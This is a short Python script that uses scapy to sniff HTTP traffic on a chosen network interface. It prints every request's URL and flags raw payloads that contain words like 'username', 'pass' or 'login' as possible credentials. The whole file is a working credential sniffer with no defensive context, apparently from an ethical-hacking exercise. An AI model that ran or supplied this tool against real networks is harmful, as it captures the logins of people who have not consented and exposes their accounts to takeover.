#! /usr/bin/env python

import scapy.all as scapy
import sys
from scapy.layers import http

#iface specifies interface, store (stores data in memory) prn is a callback function

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "pass", "password", "login"]
            for kw in keywords:
                if kw in load:
                    return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

        


def main():
    interface = ""
    if(len(sys.argv) >= 2):
        interface=sys.argv[1]
    sniff(interface)


if __name__ == '__main__':
    main()